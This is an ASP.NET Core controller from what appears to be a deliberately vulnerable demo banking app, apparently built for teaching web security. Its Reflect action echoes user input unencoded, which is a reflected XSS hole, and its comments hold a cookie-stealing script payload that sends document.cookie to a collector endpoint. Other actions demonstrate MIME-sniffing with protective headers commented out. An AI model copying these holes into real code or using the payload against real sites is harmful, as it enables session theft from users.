using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading.Tasks;
using ElmahCore;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using Newtonsoft.Json;
using TerribleBankInc.Models.ViewModels;

namespace TerribleBankInc.Controllers;

public class HomeController : BaseController
{
    private readonly ILogger<HomeController> _logger;

    public HomeController(ILogger<HomeController> logger)
    {
        _logger = logger;
    }

    public IActionResult Index()
    {
        return View();
    }

    public IActionResult Privacy()
    {
        return View();
    }

    public IActionResult Boom()
    {
        HttpContext.RiseError(new NotImplementedException("Forgot something?"));
        return null;
    }

    [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
    public IActionResult Error()
    {
        return View(
            new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier }
        );
    }

    public IActionResult Reflect(string search = null)
    {
        //<script>const request = new Request('https://localhost:44367/api/Gimme?stringData='+"{'ID':0,'DataType':'Cookie','Data':'"+document.cookie+"'}", {method: 'GET'});fetch(request);</script>
        //https://localhost:5001/Home/Reflect?search=%3Cscript%3Econst+request+%3D+new+Request%28%27https%3A%2F%2Flocalhost%3A44367%2Fapi%2FGimme%3FstringData%3D%27%2B%22%7B%27ID%27%3A0%2C%27DataType%27%3A%27Cookie%27%2C%27Data%27%3A%27%22%2Bdocument.cookie%2B%22%27%7D%22%2C+%7Bmethod%3A+%27GET%27%7D%29%3Bfetch%28request%29%3B%3C%2Fscript%3E
        //WebUtility.HtmlEncode(search)
        // https://www.chromium.org/developers/design-documents/xss-auditor

        //Response.Headers.Add("X-XSS-Protection", "1; mode=block; report=\"https://localhost:5001/Home/Report\"");

        return View(nameof(Reflect), search);
    }

    [HttpPost]
    public async Task<IActionResult> Report()
    {
        using StreamReader sr = new StreamReader(HttpContext.Request.Body);
        string stringData = await sr.ReadToEndAsync();
        return Ok();
    }

    public string ImageJpg()
    {
        Response.ContentType = "image/jpg";
        return "alert('Hello from image!');";
    }

    public string TextPlain()
    {
        Response.ContentType = "text/plain";
        //Response.Headers.Add("X-Content-Type-Options", "nosniff");
        return "alert('Hello from text!');";
    }
}
